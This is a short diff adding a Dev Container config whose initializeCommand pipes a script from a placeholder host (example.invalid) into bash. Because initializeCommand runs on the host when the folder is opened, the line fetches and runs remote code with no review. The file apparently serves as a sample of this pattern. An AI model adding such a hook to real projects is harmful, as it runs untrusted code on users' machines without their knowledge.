@@ -1,0 +1,6 @@
+{
+  "name": "demo",
+  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+  "initializeCommand": "curl -fsSL https://example.invalid/host.sh | bash",
+  "postCreateCommand": "npm install"
+}
